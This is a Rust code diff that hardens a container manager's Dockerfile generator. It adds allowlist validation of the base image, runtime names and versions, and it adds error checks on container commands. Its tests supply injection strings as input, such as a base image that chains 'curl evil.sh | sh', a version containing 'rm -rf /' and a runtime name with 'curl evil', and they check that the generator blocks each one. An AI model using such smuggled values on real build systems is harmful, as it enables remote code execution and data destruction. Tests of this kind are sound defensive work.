@@ -248,6 +248,7 @@ impl ContainerManager {
             ])
             .output()
             .context("Failed to list containers")?;
+        let output = require_successful_output(output, "Container listing")?;
 
         let stdout = String::from_utf8_lossy(&output.stdout);
         let containers = stdout
@@ -327,6 +328,7 @@ impl ContainerManager {
             ])
             .output()
             .context("Failed to list images")?;
+        let output = require_successful_output(output, "Image listing")?;
 
         let stdout = String::from_utf8_lossy(&output.stdout);
         let images = stdout
@@ -346,7 +348,23 @@ impl ContainerManager {
     }
 
     /// Generate a Dockerfile for OMG development environment
+    ///
+    /// All interpolated inputs are validated against allowlist charsets
+    /// before any formatting: `base_image` must be a plain image reference,
+    /// runtime names must pass [`validate_package_name`], and versions must
+    /// pass [`validate_version`]. Invalid values never reach the generated
+    /// text; they are replaced with safe fallbacks (or the runtime entry is
+    /// skipped) and reported via `tracing::warn!`.
     pub fn generate_dockerfile(&self, base_image: &str, runtimes: &[(&str, &str)]) -> String {
+        let base_image = if is_safe_image_reference(base_image) {
+            base_image
+        } else {
+            tracing::warn!(
+                "Refusing unsafe base image {base_image:?}; falling back to ubuntu:24.04"
+            );
+            "ubuntu:24.04"
+        };
+
         let mut dockerfile = format!("FROM {base_image}\n\n");
         dockerfile.push_str("# OMG Development Environment\n");
         dockerfile.push_str("LABEL maintainer=\"OMG Team\"\n\n");
@@ -366,11 +384,26 @@ impl ContainerManager {
 
         // Install runtimes
         for (runtime, version) in runtimes {
+            if let Err(error) = crate::core::security::validate_package_name(runtime) {
+                tracing::warn!("Skipping runtime {runtime:?} in generated Dockerfile: {error}");
+                continue;
+            }
+            let version = if version.is_empty() {
+                String::new()
+            } else if let Err(error) = crate::core::security::validate_version(version) {
+                tracing::warn!(
+                    "Replacing unsafe version {version:?} for runtime {runtime}: {error}"
+                );
+                "latest".to_string()
+            } else {
+                (*version).to_string()
+            };
+            let version = version.as_str();
             match *runtime {
                 "node" => {
                     dockerfile.push_str("# Install Node.js\n");
                     dockerfile.push_str("ENV NODE_VERSION=");
-                    dockerfile.push_str(if *version == "lts" { "20" } else { version });
+                    dockerfile.push_str(if version == "lts" { "20" } else { version });
                     dockerfile.push('\n');
                     dockerfile.push_str("RUN curl -fsSL https://deb.nodesource.com/setup_${NODE_VERSION}.x | bash - \\\n");
                     dockerfile.push_str("    && apt-get install -y nodejs \\\n");
@@ -397,11 +430,7 @@ impl ContainerManager {
                 }
                 "go" => {
                     dockerfile.push_str("# Install Go\n");
-                    let go_ver = if *version == "latest" {
-                        "1.22"
-                    } else {
-                        version
-                    };
+                    let go_ver = if version == "latest" { "1.22" } else { version };
                     dockerfile.push_str("ENV GO_VERSION=");
                     dockerfile.push_str(go_ver);
                     dockerfile.push('\n');
@@ -416,14 +445,14 @@ impl ContainerManager {
                 }
                 "java" => {
                     dockerfile.push_str("# Install Java\n");
-                    let java_pkg =
-                        if *version == "latest" || *version == "lts" || version.is_empty() {
-                            "default-jdk".to_string()
-                        } else if version.chars().all(|c| c.is_ascii_digit()) {
-                            format!("openjdk-{version}-jdk")
-                        } else {
-                            (*version).to_string()
-                        };
+                    let java_pkg = if version == "latest" || version == "lts" || version.is_empty()
+                    {
+                        "default-jdk".to_string()
+                    } else if version.chars().all(|c| c.is_ascii_digit()) {
+                        format!("openjdk-{version}-jdk")
+                    } else {
+                        version.to_string()
+                    };
                     dockerfile.push_str("RUN apt-get update && apt-get install -y ");
                     dockerfile.push_str(&java_pkg);
                     dockerfile.push_str(" \\\n");
@@ -431,7 +460,7 @@ impl ContainerManager {
                 }
                 "ruby" => {
                     dockerfile.push_str("# Install Ruby\n");
-                    let ruby_pkg = if *version == "latest" || version.is_empty() {
+                    let ruby_pkg = if version == "latest" || version.is_empty() {
                         "ruby-full".to_string()
                     } else {
                         format!("ruby{version}")
@@ -497,6 +526,38 @@ impl ContainerManager {
 
         dockerfile
     }
+}
+
+/// Whether an image reference consists only of safe Docker-reference
+/// characters. Anything else (shell metacharacters, whitespace, option-like
+/// prefixes, traversal) must never reach a generated Dockerfile.
+fn is_safe_image_reference(image: &str) -> bool {
+    !image.is_empty()
+        && image.len() <= 256
+        && image
+            .bytes()
+            .all(|b| matches!(b, b'a'..=b'z' | b'A'..=b'Z' | b'0'..=b'9' | b'.' | b'/' | b':' | b'_' | b'-'))
+        && !image.contains("..")
+        && image
+            .chars()
+            .next()
+            .is_some_and(|c: char| c.is_ascii_alphanumeric())
+}
+
+fn require_successful_output(
+    output: std::process::Output,
+    operation: &str,
+) -> Result<std::process::Output> {
+    if output.status.success() {
+        return Ok(output);
+    }
+
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    anyhow::bail!(
+        "{operation} failed with status {:?}: {}",
+        output.status.code(),
+        stderr.trim()
+    );
 }
 
 /// Information about a running container
@@ -566,6 +627,21 @@ mod tests {
         assert!(dockerfile.contains("Install Node.js") || dockerfile.contains("NODE_VERSION"));
     }
 
+    #[cfg(unix)]
+    #[test]
+    fn failed_container_command_is_not_reported_as_an_empty_result() {
+        let output = std::process::Command::new("sh")
+            .args(["-c", "printf 'daemon unavailable' >&2; exit 17"])
+            .output()
+            .expect("run failure fixture");
+
+        let error = require_successful_output(output, "Container listing")
+            .expect_err("non-zero container command must fail");
+
+        assert!(error.to_string().contains("status Some(17)"));
+        assert!(error.to_string().contains("daemon unavailable"));
+    }
+
     #[test]
     fn test_generate_dockerfile_generic() {
         let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
@@ -575,5 +651,62 @@ mod tests {
 
         let dockerfile_arch = manager.generate_dockerfile("archlinux:latest", &[("vim", "latest")]);
         assert!(dockerfile_arch.contains("pacman -S --noconfirm vim"));
+    }
+
+    #[test]
+    fn generate_dockerfile_never_emits_injected_base_image() {
+        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
+        for evil in [
+            "ubuntu:24.04 && RUN curl evil.sh | sh",
+            "ubuntu\nRUN malicious",
+            "$HOME",
+            "-flag",
+            "../../etc",
+            "",
+        ] {
+            let dockerfile = manager.generate_dockerfile(evil, &[]);
+            assert!(
+                dockerfile.starts_with("FROM ubuntu:24.04\n"),
+                "base image {evil:?}"
+            );
+            assert!(!dockerfile.contains("evil"), "base image {evil:?}");
+            assert!(!dockerfile.contains("malicious"), "base image {evil:?}");
+        }
+    }
+
+    #[test]
+    fn generate_dockerfile_never_emits_injected_versions_or_runtime_names() {
+        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
+
+        let dockerfile = manager.generate_dockerfile("ubuntu:24.04", &[("node", "20; rm -rf /")]);
+        // Note: the legitimate cleanup line `rm -rf /var/lib/apt/lists/*`
+        // exists in every Debian/Ubuntu Dockerfile, so assert on the
+        // injected payload fragments instead.
+        assert!(
+            !dockerfile.contains("20;"),
+            "version injection must be replaced"
+        );
+        assert!(
+            !dockerfile.contains("NODE_VERSION=latest;"),
+            "injected version must never survive"
+        );
+
+        let dockerfile = manager.generate_dockerfile("ubuntu:24.04", &[("pkg; curl evil", "1.0")]);
+        assert!(
+            !dockerfile.contains("curl evil") && !dockerfile.contains("install -y pkg;"),
+            "runtime-name injection must be skipped entirely"
+        );
+    }
+
+    #[test]
+    fn generate_dockerfile_accepts_valid_inputs_unchanged() {
+        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
+        let dockerfile = manager.generate_dockerfile(
+            "debian:bookworm-slim",
+            &[("node", "20.10.0"), ("go", "1.22.5")],
+        );
+        assert!(dockerfile.contains("FROM debian:bookworm-slim\n"));
+        assert!(dockerfile.contains("NODE_VERSION=20.10.0"));
+        assert!(dockerfile.contains("GO_VERSION=1.22.5"));
     }
 }
